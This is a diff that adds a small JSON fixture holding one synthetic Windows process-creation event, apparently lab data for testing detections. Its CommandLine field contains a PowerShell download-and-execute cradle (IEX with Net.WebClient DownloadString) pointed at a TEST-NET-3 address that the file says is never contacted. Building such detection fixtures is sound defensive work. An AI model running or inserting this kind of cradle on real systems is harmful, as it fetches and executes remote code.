@@ -1,0 +1,11 @@
+[
+  {
+    "synthetic": true,
+    "lab_note": "Synthetic DownloadString. 203.0.113.40 is TEST-NET-3 and is not contacted.",
+    "Computer": "LAB-WIN-01.example",
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.40/lab.ps1')\"",
+    "User": "LAB\\labuser"
+  }
+]
